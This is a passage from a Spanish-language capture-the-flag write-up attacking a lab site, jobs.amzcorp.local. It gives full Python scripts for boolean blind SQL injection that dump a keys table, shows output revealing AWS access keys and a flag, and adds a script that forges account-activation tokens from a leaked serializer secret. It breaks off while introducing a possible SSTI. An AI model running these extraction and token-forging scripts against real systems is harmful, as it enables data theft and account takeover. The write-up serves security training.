            print("No se pudo determinar el número de filas")
            return 0

def extract_columns(table_name):
    """
    Extrae los nombres de las columnas de una tabla específica
    """
    url = "http://jobs.amzcorp.local/admin/users/search"
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_-'
    
    column_index = 0
    columns = []
    
    print(f"\nExtrayendo columnas de la tabla '{table_name}'...")
    
    while True:
        column_name = ""
        position = 1
        
        while True:
            found_char = None
            
            for char in chars:
                payload = f"diseo' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema = 'jobs' AND table_name = '{table_name}' LIMIT {column_index},1),{position},1) = '{char}'#"
                
                print(f"\rProbando columna#{column_index}, posición {position}: {char}", end="", flush=True)
                
                if check_condition(url, payload):
                    column_name += char
                    found_char = char
                    print(f" -> Encontrado: {char}")
                    break
            
            if not found_char:
                payload = f"diseo' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema = 'jobs' AND table_name = '{table_name}' LIMIT {column_index},1),{position},1) = ''#"
                if check_condition(url, payload):
                    print(f"\nFin del nombre de la columna #{column_index}")
                    break
                else:
                    # Probar caracteres especiales adicionales
                    special_chars = ' .'
                    for char in special_chars:
                        payload = f"diseo' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema = 'jobs' AND table_name = '{table_name}' LIMIT {column_index},1),{position},1) = '{char}'#"
                        if check_condition(url, payload):
                            column_name += char
                            found_char = char
                            print(f"Encontrado (carácter especial): '{char}'")
                            break
                    
                    if not found_char:
                        print(f"\nNo se pudo encontrar el carácter en posición {position}. Terminando columna...")
                        break
            
            position += 1
        
        if column_name:
            columns.append(column_name)
            print(f"Columna encontrada #{column_index}: {column_name}")
            
            # Verificar si hay más columnas
            payload = f"diseo' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = 'jobs' AND table_name = '{table_name}') > {column_index + 1}#"
            if check_condition(url, payload):
                column_index += 1
            else:
                print(f"\nNo hay más columnas en la tabla '{table_name}'. Total encontradas: {len(columns)}")
                break
        else:
            break
    
    return columns

def extract_cell_value(table_name, row_index, column_index):
    """
    Extrae el valor de una celda específica (fila, columna)
    """
    url = "http://jobs.amzcorp.local/admin/users/search"
    
    # Caracteres más amplios para datos (incluye espacios y caracteres especiales)
    chars = string.ascii_letters + string.digits + string.punctuation + ' '
    
    value = ""
    position = 1
    
    while True:
        found_char = False
        
        for char in chars:
            # Usamos CONCAT para evitar problemas con valores NULL
            payload = f"diseo' AND SUBSTRING((SELECT CONCAT('',`col{column_index}`) FROM (SELECT * FROM jobs.{table_name} LIMIT {row_index},1) AS t),{position},1) = '{char}'#"
            
            print(f"\rFila {row_index}, Col {column_index}, Pos {position}: Probando '{repr(char)}'", end="", flush=True)
            
            if check_condition(url, payload):
                value += char
                found_char = True
                print(f" -> Encontrado: '{repr(char)}'")
                break
        
        if not found_char:
            # Verificar si es el final de la cadena (valor NULL o fin)
            payload = f"diseo' AND SUBSTRING((SELECT CONCAT('',`col{column_index}`) FROM (SELECT * FROM jobs.{table_name} LIMIT {row_index},1) AS t),{position},1) = ''#"
            
            if check_condition(url, payload):
                print(f"\nFin del valor en fila {row_index}, columna {column_index}")
                break
            else:
                # Intenta con caracteres Unicode básicos
                payload = f"diseo' AND LENGTH((SELECT CONCAT('',`col{column_index}`) FROM (SELECT * FROM jobs.{table_name} LIMIT {row_index},1) AS t)) < {position}#"
                if check_condition(url, payload):
                    print(f"\nLongitud del valor alcanzada en fila {row_index}, columna {column_index}")
                    break
                else:
                    print(f"\nNo se pudo extraer el carácter en posición {position}. Valor parcial: '{value}'")
                    value += "?"
                    break
        
        position += 1
        # Límite de longitud por seguridad
        if position > 1000:
            print(f"\nLímite de longitud alcanzado para celda")
            break
    
    return value

def extract_table_data(table_name, columns):
    """
    Extrae todos los datos de una tabla
    """
    print(f"\n{'='*80}")
    print(f"EXTRACIÓN DE DATOS DE LA TABLA: {table_name}")
    print(f"{'='*80}")
    
    # Primero obtenemos el número de filas
    row_count = get_row_count(table_name)
    
    if row_count == 0:
        print("La tabla está vacía o no se pudo determinar el número de filas")
        return []
    
    print(f"\nLa tabla tiene {row_count} fila(s)")
    print(f"Columnas: {', '.join(columns)}")
    
    all_data = []
    
    # Para cada fila
    for row_index in range(row_count):
        print(f"\n{'='*60}")
        print(f"Extrayendo fila #{row_index + 1} de {row_count}")
        print(f"{'='*60}")
        
        row_data = []
        
        # Para cada columna
        for col_index, column_name in enumerate(columns):
            print(f"\nExtrayendo columna: {column_name}...")
            
            # Necesitamos construir un payload que use el nombre real de la columna
            # Primero probamos con el nombre de columna real
            value = extract_cell_value_with_column_name(table_name, row_index, column_name)
            
            if not value:
                # Si falla, intentamos con un enfoque alternativo
                print(f"Intento alternativo para columna {column_name}...")
                value = extract_cell_value_alternative(table_name, row_index, col_index)
            
            row_data.append({
                'column': column_name,
                'value': value
            })
        
        all_data.append(row_data)
        
        # Mostrar resumen de la fila extraída
        print(f"\nResumen fila #{row_index + 1}:")
        for item in row_data:
            print(f"  {item['column']}: {repr(item['value'])}")
    
    return all_data

def extract_cell_value_with_column_name(table_name, row_index, column_name):
    """
    Extrae el valor de una celda usando el nombre real de la columna
    """
    url = "http://jobs.amzcorp.local/admin/users/search"
    chars = string.printable  # Todos los caracteres imprimibles
    
    value = ""
    position = 1
    
    while True:
        found_char = False
        
        for char in chars:
            # Escapar comillas simples en el nombre de columna si es necesario
            col_name_escaped = column_name.replace("'", "''")
            
            # Usar backticks para el nombre de columna
            payload = f"diseo' AND SUBSTRING((SELECT CONCAT('',`{col_name_escaped}`) FROM jobs.{table_name} LIMIT {row_index},1),{position},1) = '{char}'#"
            
            print(f"\rFila {row_index}, Col '{column_name}', Pos {position}: Probando '{repr(char)}'", end="", flush=True)
            
            try:
                if check_condition(url, payload):
                    value += char
                    found_char = True
                    print(f" -> Encontrado: '{repr(char)}'")
                    break
            except:
                continue
        
        if not found_char:
            # Verificar si es el final
            col_name_escaped = column_name.replace("'", "''")
            payload = f"diseo' AND SUBSTRING((SELECT CONCAT('',`{col_name_escaped}`) FROM jobs.{table_name} LIMIT {row_index},1),{position},1) = ''#"
            
            if check_condition(url, payload):
                print(f"\nFin del valor para columna '{column_name}'")
                break
            else:
                # Verificar longitud
                payload = f"diseo' AND LENGTH((SELECT CONCAT('',`{col_name_escaped}`) FROM jobs.{table_name} LIMIT {row_index},1)) < {position}#"
                if check_condition(url, payload):
                    print(f"\nLongitud alcanzada para columna '{column_name}'")
                    break
                else:
                    print(f"\nNo se pudo extraer más de la columna '{column_name}'. Valor parcial: '{value}'")
                    break
        
        position += 1
        if position > 500:  # Límite de longitud
            print(f"\nLímite de longitud para columna '{column_name}'")
            break
    
    return value

def extract_cell_value_alternative(table_name, row_index, col_index):
    """
    Enfoque alternativo usando numeración de columnas
    """
    url = "http://jobs.amzcorp.local/admin/users/search"
    chars = string.printable
    
    value = ""
    position = 1
    
    # Construir una consulta que seleccione todas las columnas y extraiga una específica
    # Esto es más complejo y puede necesitar ajustes según el DBMS
    
    while True:
        found_char = False
        
        for char in chars:
            # Enfoque usando subquery con alias numéricos
            # Nota: Esto puede variar según la versión de MySQL/MariaDB
            payload = f"diseo' AND SUBSTRING((SELECT CONCAT('',c) FROM (SELECT @row:=@row+1 as row_id, " + \
                     f"@col{col_index} as c FROM jobs.{table_name}, (SELECT @row:=0, @col0:='', @col1:='', @col2:='', @col3:='', @col4:='', @col5:='', @col6:='', @col7:='', @col8:='', @col9:='') as vars LIMIT {row_index},1) as t),{position},1) = '{char}'#"
            
            print(f"\r[Alt] Fila {row_index}, Col {col_index}, Pos {position}: Probando '{repr(char)}'", end="", flush=True)
            
            try:
                if check_condition(url, payload):
                    value += char
                    found_char = True
                    print(f" -> Encontrado: '{repr(char)}'")
                    break
            except:
                continue
        
        if not found_char or position > 100:
            break
        
        position += 1
    
    return value if value else None

def save_to_file(table_name, columns, data):
    """
    Guarda los datos extraídos en un archivo
    """
    filename = f"{table_name}_data.txt"
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"Datos de la tabla: {table_name}\n")
        f.write(f"Columnas: {', '.join(columns)}\n")
        f.write("="*80 + "\n\n")
        
        for row_index, row_data in enumerate(data):
            f.write(f"\nFila #{row_index + 1}:\n")
            f.write("-"*40 + "\n")
            
            for item in row_data:
                f.write(f"{item['column']}: {item['value']}\n")
        
        f.write(f"\n\nTotal de filas: {len(data)}\n")
    
    print(f"\nDatos guardados en: {filename}")
    return filename

if __name__ == "__main__":
    # Tablas descubiertas
    discovered_tables = [
        "profiles",
        "application", 
        "role",
        "users",
        "position",
        "keys_tbl",
        "inventory"
    ]
    
    print("="*80)
    print("EXTRACCIÓN DE DATOS DE TABLAS - Base de datos: jobs")
    print("="*80)
    
    print("\nTablas disponibles:")
    for i, table in enumerate(discovered_tables):
        print(f"{i}: {table}")
    
    try:
        table_index = int(input("\nIngrese el número de la tabla a extraer: "))
        
        if 0 <= table_index < len(discovered_tables):
            table_name = discovered_tables[table_index]
            
            print(f"\nSeleccionada tabla: {table_name}")
            
            # Paso 1: Extraer columnas
            columns = extract_columns(table_name)
            
            if not columns:
                print("No se pudieron extraer las columnas. Intentando determinar columnas...")
                column_count = get_column_count(table_name)
                if column_count > 0:
                    columns = [f"col{i}" for i in range(column_count)]
                    print(f"Usando nombres genéricos para {column_count} columnas")
                else:
                    print("No se pudo proceder sin información de columnas")
                    exit()
            
            print(f"\nColumnas identificadas: {columns}")
            
            # Confirmar antes de proceder con la extracción completa
            response = input(f"\n¿Desea extraer TODOS los datos de la tabla '{table_name}'? (s/n): ")
            
            if response.lower() == 's':
                # Paso 2: Extraer todos los datos
                table_data = extract_table_data(table_name, columns)
                
                if table_data:
                    # Paso 3: Guardar en archivo
                    filename = save_to_file(table_name, columns, table_data)
                    
                    # Mostrar resumen
                    print(f"\n{'='*80}")
                    print("RESUMEN DE EXTRACCIÓN:")
                    print(f"{'='*80}")
                    print(f"Tabla: {table_name}")
                    print(f"Columnas extraídas: {len(columns)}")
                    print(f"Filas extraídas: {len(table_data)}")
                    print(f"Archivo generado: {filename}")
                    
                    # Mostrar vista previa
                    print(f"\nVista previa (primera fila):")
                    if table_data:
                        for item in table_data[0]:
                            print(f"  {item['column']}: {repr(item['value'][:50])}{'...' if len(item['value']) > 50 else ''}")
                else:
                    print("No se pudieron extraer datos de la tabla")
            else:
                print("Operación cancelada")
        else:
            print("Índice de tabla inválido")
            
    except ValueError:
        print("Entrada inválida. Debe ingresar un número.")
    except KeyboardInterrupt:
        print("\n\nOperación cancelada por el usuario")
    except Exception as e:
        print(f"\nError inesperado: {e}")
```

Ahora lo ejecutamos de esta forma, en este script meti las tablas descubiertas y en formato bucle te da a elegir las tablas de las que quieres sacar las columnas, para despues sacar la info.

```shell
python3 extractInfo.py
```

Info:

```
================================================================================
EXTRACCIÓN DE DATOS DE TABLAS - Base de datos: jobs
================================================================================

Tablas disponibles:
0: profiles
1: application
2: role
3: users
4: position
5: keys_tbl
6: inventory

Ingrese el número de la tabla a extraer: 5

Seleccionada tabla: keys_tbl

Extrayendo columnas de la tabla 'keys_tbl'...
Probando columna#0, posición 1: i -> Encontrado: i
..............
Fin del nombre de la columna #0
Columna encontrada #0: id
Probando columna#1, posición 1: k -> Encontrado: k
..............
Fin del nombre de la columna #1
Columna encontrada #1: key_name
Probando columna#2, posición 1: k -> Encontrado: k
..............
Fin del nombre de la columna #2
Columna encontrada #2: key_value

No hay más columnas en la tabla 'keys_tbl'. Total encontradas: 3

Columnas identificadas: ['id', 'key_name', 'key_value']
```

Ahora vamos a intentar extraer la informacion de las columnas con este script.

> extractColumns.py

```python
import requests
import string
import time

def check_condition(url, payload):
    """
    Envía la petición y verifica si el usuario 'diseo' aparece en la respuesta
    """
    headers = {
        'Host': 'jobs.amzcorp.local',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://jobs.amzcorp.local',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Referer': 'http://jobs.amzcorp.local/admin/users/search',
        'Cookie': 'session=<TOKEN_SESSION>',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i'
    }
    
    data = {
        'username': payload
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        
        # Verificar si aparece el usuario 'diseo' en la respuesta
        if '>diseo</td>' in response.text:
            return True
        else:
            return False
            
    except Exception as e:
        print(f"Error en la petición: {e}")
        return False

def extract_keys_tbl():
    """
    Extrae los datos de la tabla keys_tbl de forma secuencial
    """
    url = "http://jobs.amzcorp.local/admin/users/search"
    
    # Caracteres específicos para cada columna
    chars_id = string.digits  # Solo números para id
    
    # Para key_name: letras, números, guión bajo
    chars_key_name = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_'
    
    # Para key_value: letras, números y caracteres especiales comunes
    special_chars = '+/=-_{}'  # Caracteres especiales específicos
    chars_key_value = string.ascii_letters + string.digits + special_chars
    
    row_index = 0  # Empezamos con la primera fila
    all_data = []
    
    print("Iniciando extracción de keys_tbl...")
    print("Lógica secuencial: id → key_name → key_value → siguiente fila")
    print("-" * 60)
    
    # Primero verificar cuántas filas hay
    print("Determinando número de filas...")
    row_count = 0
    while True:
        payload = f"diseo' AND (SELECT COUNT(*) FROM jobs.keys_tbl) = {row_count}#"
        print(f"\rProbando {row_count} filas...", end="", flush=True)
        
        if check_condition(url, payload):
            print(f"\nNúmero de filas encontrado: {row_count}")
            break
        row_count += 1
        
        if row_count > 100:  # Límite de seguridad
            print(f"\nNo se pudo determinar el número de filas (probado hasta 100)")
            row_count = 0
            break
    
    if row_count == 0:
        print("La tabla está vacía o no se pudo acceder")
        return []
    
    print(f"\nExtrayendo {row_count} fila(s) de keys_tbl...")
    print("-" * 60)
    
    for current_row in range(row_count):
        print(f"\n{'='*40}")
        print(f"FILA #{current_row + 1}")
        print(f"{'='*40}")
        
        row_data = {}
        
        # 1. Extraer ID
        print("Extrayendo id...")
        id_val = ""
        position = 1
        
        while True:
            found_char = None
            
            for char in chars_id:
                payload = f"diseo' AND SUBSTRING((SELECT id FROM jobs.keys_tbl LIMIT {current_row},1),{position},1) = '{char}'#"
                
                print(f"\r  Posición {position}: probando '{char}'", end="", flush=True)
                
                if check_condition(url, payload):
                    id_val += char
                    found_char = char
                    print(f" -> encontrado: '{char}'")
                    break
            
            if not found_char:
                # Verificar si es el final del id
                payload = f"diseo' AND SUBSTRING((SELECT id FROM jobs.keys_tbl LIMIT {current_row},1),{position},1) = ''#"
                
                if check_condition(url, payload):
                    print(f"\n  Fin del id. Valor: '{id_val}'")
                    break
                else:
                    print(f"\n  No se encontró más caracteres para id")
                    break
            
            position += 1
            time.sleep(0.1)  # Pequeña pausa para no saturar
        
        row_data['id'] = id_val
        
        # 2. Extraer KEY_NAME
        print("\nExtrayendo key_name...")
        key_name_val = ""
        position = 1
        
        while True:
            found_char = None
            
            for char in chars_key_name:
                payload = f"diseo' AND SUBSTRING((SELECT key_name FROM jobs.keys_tbl LIMIT {current_row},1),{position},1) = '{char}'#"
                
                print(f"\r  Posición {position}: probando '{char}'", end="", flush=True)
                
                if check_condition(url, payload):
                    key_name_val += char
                    found_char = char
                    print(f" -> encontrado: '{char}'")
                    break
            
            if not found_char:
                # Verificar si es el final
                payload = f"diseo' AND SUBSTRING((SELECT key_name FROM jobs.keys_tbl LIMIT {current_row},1),{position},1) = ''#"
                
                if check_condition(url, payload):
                    print(f"\n  Fin del key_name. Valor: '{key_name_val}'")
                    break
                else:
                    # Probar caracteres especiales adicionales
                    for char in special_chars:
                        payload = f"diseo' AND SUBSTRING((SELECT key_name FROM jobs.keys_tbl LIMIT {current_row},1),{position},1) = '{char}'#"
                        
                        if check_condition(url, payload):
                            key_name_val += char
                            found_char = char
                            print(f" -> encontrado (especial): '{char}'")
                            break
                    
                    if not found_char:
                        print(f"\n  No se encontró más caracteres para key_name")
                        break
            
            position += 1
            time.sleep(0.1)  # Pequeña pausa
        
        row_data['key_name'] = key_name_val
        
        # 3. Extraer KEY_VALUE
        print("\nExtrayendo key_value...")
        key_value_val = ""
        position = 1
        
        while True:
            found_char = None
            
            # Primero probar caracteres alfanuméricos
            for char in string.ascii_letters + string.digits:
                payload = f"diseo' AND SUBSTRING((SELECT key_value FROM jobs.keys_tbl LIMIT {current_row},1),{position},1) = '{char}'#"
                
                print(f"\r  Posición {position}: probando '{char}'", end="", flush=True)
                
                if check_condition(url, payload):
                    key_value_val += char
                    found_char = char
                    print(f" -> encontrado: '{char}'")
                    break
            
            if not found_char:
                # Probar caracteres especiales
                for char in special_chars:
                    payload = f"diseo' AND SUBSTRING((SELECT key_value FROM jobs.keys_tbl LIMIT {current_row},1),{position},1) = '{char}'#"
                    
                    if check_condition(url, payload):
                        key_value_val += char
                        found_char = char
                        print(f" -> encontrado (especial): '{char}'")
                        break
            
            if not found_char:
                # Verificar si es el final
                payload = f"diseo' AND SUBSTRING((SELECT key_value FROM jobs.keys_tbl LIMIT {current_row},1),{position},1) = ''#"
                
                if check_condition(url, payload):
                    print(f"\n  Fin del key_value. Valor: '{key_value_val}'")
                    break
                else:
                    # Probar algunos otros caracteres comunes
                    other_chars = ' .:@'
                    for char in other_chars:
                        payload = f"diseo' AND SUBSTRING((SELECT key_value FROM jobs.keys_tbl LIMIT {current_row},1),{position},1) = '{char}'#"
                        
                        if check_condition(url, payload):
                            key_value_val += char
                            found_char = char
                            print(f" -> encontrado (otro): '{char}'")
                            break
                    
                    if not found_char:
                        print(f"\n  No se encontró más caracteres para key_value")
                        break
            
            position += 1
            time.sleep(0.1)  # Pequeña pausa
            
            # Límite de seguridad para key_value
            if position > 500:
                print(f"\n  Límite de longitud alcanzado (500 caracteres)")
                break
        
        row_data['key_value'] = key_value_val
        
        # Guardar fila extraída
        all_data.append(row_data)
        
        # Mostrar resumen de la fila
        print(f"\nResumen fila #{current_row + 1}:")
        print(f"  id:        '{row_data['id']}'")
        print(f"  key_name:  '{row_data['key_name']}'")
        
        # Mostrar key_value (truncado si es muy largo)
        kv = row_data['key_value']
        if len(kv) > 50:
            print(f"  key_value: '{kv[:50]}...' ({len(kv)} caracteres)")
        else:
            print(f"  key_value: '{kv}'")
        
        print(f"\n{'='*40}")
        
        # Pausa entre filas para no saturar
        if current_row < row_count - 1:
            print("Pausa de 2 segundos antes de siguiente fila...")
            time.sleep(2)
    
    return all_data

def save_results(data, filename="keys_tbl_data.txt"):
    """
    Guarda los resultados en un archivo
    """
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("="*60 + "\n")
        f.write("DATOS DE keys_tbl - Extracción secuencial\n")
        f.write("="*60 + "\n\n")
        
        f.write(f"Total de filas: {len(data)}\n")
        f.write("-"*60 + "\n\n")
        
        for i, row in enumerate(data):
            f.write(f"FILA #{i + 1}:\n")
            f.write("-"*40 + "\n")
            f.write(f"ID:        '{row['id']}'\n")
            f.write(f"KEY_NAME:  '{row['key_name']}'\n")
            f.write(f"KEY_VALUE: '{row['key_value']}'\n\n")
    
    print(f"\nDatos guardados en: {filename}")
    return filename

if __name__ == "__main__":
    print("="*60)
    print("EXTRACCIÓN SECUENCIAL DE keys_tbl")
    print("="*60)
    
    # Extraer los datos
    data = extract_keys_tbl()
    
    if data:
        # Guardar en archivo
        filename = save_results(data)
        
        # Mostrar resumen final
        print("\n" + "="*60)
        print("RESUMEN FINAL")
        print("="*60)
        print(f"Total de filas extraídas: {len(data)}")
        
        print("\nContenido extraído:")
        for i, row in enumerate(data):
            print(f"\nFila {i + 1}:")
            print(f"  id:   '{row['id']}'")
            print(f"  name: '{row['key_name']}'")
            
            val = row['key_value']
            if len(val) > 40:
                print(f"  value: '{val[:40]}...'")
            else:
                print(f"  value: '{val}'")
        
        print(f"\nArchivo generado: {filename}")
    else:
        print("No se pudieron extraer datos.")
    
    print("\n" + "="*60)
```

Lo ejecutamos de esta forma:

```shell
python3 extractInfoKeys.py
```

Info:

```
============================================================
EXTRACCIÓN SECUENCIAL DE keys_tbl
============================================================
Iniciando extracción de keys_tbl...
Lógica secuencial: id → key_name → key_value → siguiente fila
------------------------------------------------------------
Determinando número de filas...
Probando 3 filas...
Número de filas encontrado: 3

Extrayendo 3 fila(s) de keys_tbl...
------------------------------------------------------------

========================================
FILA #1
========================================
Extrayendo id...
  Posición 1: probando '1' -> encontrado: '1'
  Posición 2: probando '9'
  Fin del id. Valor: '1'

Extrayendo key_name...
  Posición 1: probando 'a' -> encontrado: 'a'
  .............
  Fin del key_name. Valor: 'aws_access_key_id'

Extrayendo key_value...
  Posición 1: probando 'a' -> encontrado: 'a'
  .............
  Fin del key_value. Valor: 'akia3g38bcn8scjorkfl'

Resumen fila #1:
  id:        '1'
  key_name:  'aws_access_key_id'
  key_value: 'akia3g38bcn8scjorkfl'

========================================
Pausa de 2 segundos antes de siguiente fila...

========================================
FILA #2
========================================
Extrayendo id...
  Posición 1: probando '2' -> encontrado: '2'
  .............
  Fin del id. Valor: '2'

Extrayendo key_name...
  Posición 1: probando 'a' -> encontrado: 'a'
  .............
  Fin del key_name. Valor: 'aws_secret_access_key'

Extrayendo key_value...
  Posición 1: probando 'g' -> encontrado: 'g'
  .............
  Fin del key_value. Valor: 'gmtenubigygbeyoc+gpxsofbqffa3ggvpvb1fajf'

Resumen fila #2:
  id:        '2'
  key_name:  'aws_secret_access_key'
  key_value: 'gmtenubigygbeyoc+gpxsofbqffa3ggvpvb1fajf'

========================================
Pausa de 2 segundos antes de siguiente fila...

========================================
FILA #3
========================================
Extrayendo id...
  Posición 1: probando '3' -> encontrado: '3'
  .............
  Fin del id. Valor: '3'

Extrayendo key_name...
  Posición 1: probando 'f' -> encontrado: 'f'
  .............
  Fin del key_name. Valor: 'flag'

Extrayendo key_value...
  Posición 1: probando 'a' -> encontrado: 'a'
  .............
  Fin del key_value. Valor: 'aws{mysql_t1m3_b453d_1nj3c71on5_4_7h3_w1n}'

Resumen fila #3:
  id:        '3'
  key_name:  'flag'
  key_value: 'aws{mysql_t1m3_b453d_1nj3c71on5_4_7h3_w1n}'

========================================
```

Veremos que de toda la informacion que sacamos, sacamos un usuario y una `flag` por lo que ya habremos obtenido la siguiente `flag`.

> Statement (Flag)

```
aws{mysql_t1m3_b453d_1nj3c71on5_4_7h3_w1n}
```

## Relentless

Si probamos a crear una cuenta en un `subdominio` que encontramos anteriormente (`http://company-support.amzcorp.local/login`), por ejemplo con el mismo usuario que registramos en el `subdominio` `jobs.amzcorp.local` veremos que se crea, por lo que la pagina principal con esta van por separado y si queremos iniciar sesion con dicho usuario nos dara el siguiente mensaje:

<figure><img src="../../.gitbook/assets/Pasted image 20251227110754.png" alt=""><figcaption></figcaption></figure>

Veremos que nos pone `Acceso denegado`, como si la cuenta no estuviera `habilitada` en esta parte del `subdominio`, si investigamos el `.git` de antes, veremos una funcion que esta relacionado con esto:

```python
# support_portal/apps/authentication/routes.py -> support_portal/apps/home/routes.py
@blueprint.route('/confirm_account/<secretstring>', methods=['GET', 'POST'])
def confirm_account(secretstring):
    s = URLSafeSerializer('serliaizer_code')
    username, email = s.loads(secretstring)

    user = Users.query.filter_by(username=username).first()
    user.account_status = True  # ¡Aquí se habilita!
    db.session.add(user)
    db.session.commit()
```

Vemos que cuando se crea un usuario se envia un `email` de verificacion para que le llegue el `link` y poder habilitar la cuenta.

```python
@blueprint.route('/login', methods=['GET', 'POST'])
def login():
    # ... código de login ...
    
    # Después de hacer login exitoso:
    data = decode_jwt(request.cookies.get('aws_auth'))
    get_user = Users.query.filter_by(username=data['username']).first()
    
    if get_user.role == "Administrators":
        return redirect(url_for('home_blueprint.dashboard'))
    else:
        return redirect(url_for('home_blueprint.user_dashboard'))  # Redirige a user_dashboard
```

Y en esa parte esta el `login` que verifica si la cuenta esta `habilitada`.

Sabiendo todo esto podremos generar nuestro propio `TOKEN` de verificacion de `email` sabiendo lo que esta haciendo por detras para generar todo esto realizando una peticion a la `API`, por lo que vamos a crear un script en `python3` para que nos genere dicho `TOKEN` de verificacion.

> generateURL.py

```python
#!/usr/bin/env python3
from itsdangerous import URLSafeSerializer
import argparse
import sys

def generate_activation_link(username, email, base_url="http://company-support.amzcorp.local"):
    """
    Genera un enlace de activación para un usuario
    """
    # Usamos la misma clave que en el código fuente
    s = URLSafeSerializer('serliaizer_code')
    
    # Serializamos username y email como lista
    key = s.dumps([username, email])
    
    # Construimos la URL completa
    url = f"{base_url}/confirm_account/{key}"
    
    return url, key

def decode_activation_link(token):
    """
    Decodifica un token para verificar su contenido
    """
    try:
        s = URLSafeSerializer('serliaizer_code')
        data = s.loads(token)
        return data
    except Exception as e:
        return f"Error decodificando token: {e}"

def main():
    parser = argparse.ArgumentParser(description='Generador de enlaces de activación para company-support.amzcorp.local')
    parser.add_argument('-u', '--username', help='Nombre de usuario')
    parser.add_argument('-e', '--email', help='Email del usuario')
    parser.add_argument('-d', '--decode', help='Decodificar un token existente')
    parser.add_argument('-b', '--base-url', default='http://company-support.amzcorp.local',
                       help='URL base (por defecto: http://company-support.amzcorp.local)')
    parser.add_argument('-l', '--list', action='store_true',
                       help='Generar enlaces para una lista de usuarios desde un archivo')
    parser.add_argument('-f', '--file', help='Archivo con usuarios (formato: username:email)')
    
    args = parser.parse_args()
    
    if args.decode:
        # Modo decodificación
        print("="*60)
        print("DECODIFICANDO TOKEN")
        print("="*60)
        result = decode_activation_link(args.decode)
        print(f"Token: {args.decode}")
        print(f"Contenido: {result}")
        print("="*60)
        return
    
    if args.list and args.file:
        # Modo lista desde archivo
        print("="*60)
        print("GENERANDO ENLACES DESDE ARCHIVO")
        print("="*60)
        
        try:
            with open(args.file, 'r') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if ':' in line:
                            username, email = line.split(':', 1)
                            url, token = generate_activation_link(username.strip(), email.strip(), args.base_url)
                            print(f"\n[{line_num}] Usuario: {username.strip()}")
                            print(f"    Email: {email.strip()}")
                            print(f"    Token: {token}")
                            print(f"    URL: {url}")
                        else:
                            print(f"[!] Línea {line_num}: Formato incorrecto (debe ser username:email)")
        except FileNotFoundError:
            print(f"[!] Archivo no encontrado: {args.file}")
            return
    
    elif args.username and args.email:
        # Modo usuario individual
        print("="*60)
        print("GENERANDO ENLACE DE ACTIVACIÓN")
        print("="*60)
        
        url, token = generate_activation_link(args.username, args.email, args.base_url)
        
        print(f"Usuario: {args.username}")
        print(f"Email: {args.email}")
        print(f"\nToken generado: {token}")
        print(f"\nURL de activación: {url}")
        
        # También mostrar como comando curl
        print(f"\n" + "="*60)
        print("PRUEBA DIRECTA CON CURL:")
        print("="*60)
        print(f"curl -s '{url}'")
        
        # Decodificar para verificar
        print(f"\n" + "="*60)
        print("VERIFICACIÓN (decodificación):")
        print("="*60)
        decoded = decode_activation_link(token)
        print(f"Contenido decodificado: {decoded}")
    
    else:
        # Modo interactivo
        print("="*60)
        print("GENERADOR DE ENLACES DE ACTIVACIÓN")
        print("="*60)
        
        username = input("Nombre de usuario: ").strip()
        email = input("Email: ").strip()
        
        if username and email:
            url, token = generate_activation_link(username, email, args.base_url)
            
            print(f"\n" + "="*60)
            print("RESULTADO:")
            print("="*60)
            print(f"Usuario: {username}")
            print(f"Email: {email}")
            print(f"\nToken: {token}")
            print(f"\nURL completa: {url}")
            
            # Opción para copiar al portapapeles
            try:
                import pyperclip
                pyperclip.copy(url)
                print(f"\n✓ URL copiada al portapapeles")
            except:
                print(f"\n⚠  Instala 'pyperclip' para copiar automáticamente:")
                print(f"   pip install pyperclip")
        
        else:
            print("[!] Debes proporcionar usuario y email")
    
    print("="*60)

if __name__ == "__main__":
    main()
```

Ahora vamos a ejecutarlo de esta forma:

```shell
python3 generateURL.py
```

Info:

```
============================================================
GENERANDO ENLACE DE ACTIVACIÓN
============================================================
Usuario: diseo
Email: diseo@test.com

Token generado: WyJkaXNlbyIsImRpc2VvQHRlc3QuY29tIl0.Bjpc4CJ0RYKm-2tBfa0Nyc3MUYA

URL de activación: http://company-support.amzcorp.local/confirm_account/WyJkaXNlbyIsImRpc2VvQHRlc3QuY29tIl0.Bjpc4CJ0RYKm-2tBfa0Nyc3MUYA

============================================================
PRUEBA DIRECTA CON CURL:
============================================================
curl -s 'http://company-support.amzcorp.local/confirm_account/WyJkaXNlbyIsImRpc2VvQHRlc3QuY29tIl0.Bjpc4CJ0RYKm-2tBfa0Nyc3MUYA'

============================================================
VERIFICACIÓN (decodificación):
============================================================
Contenido decodificado: ['diseo', 'diseo@test.com']
============================================================
```

Si abrimos el navegador y metemos la siguiente `URL` en mi caso:

```
URL = http://company-support.amzcorp.local/confirm_account/WyJkaXNlbyIsImRpc2VvQHRlc3QuY29tIl0.Bjpc4CJ0RYKm-2tBfa0Nyc3MUYA
```

Veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251227111910.png" alt=""><figcaption></figcaption></figure>

Vemos que se nos ha verificado de forma satisfactoria, ahora si probamos a iniciar sesion, veremos que funciona:

<figure><img src="../../.gitbook/assets/Pasted image 20251227111928.png" alt=""><figcaption></figcaption></figure>

### Posible SSTI en tickets

Mirando esta parte del codigo en esta funcion con el tema de los `tickets` veremos que puede haber un posible `SSTI`:

```python
@blueprint.route('/admin/tickets/view/<id>', methods=['GET'])
@login_required
def view_ticket(id):
    data = decode_jwt(request.cookies.get('aws_auth'))
    if verify(request.cookies.get('aws_auth')):
        user_authed = Users.query.filter_by(username=data['username']).first()
        if user_authed.role == "Administrators":
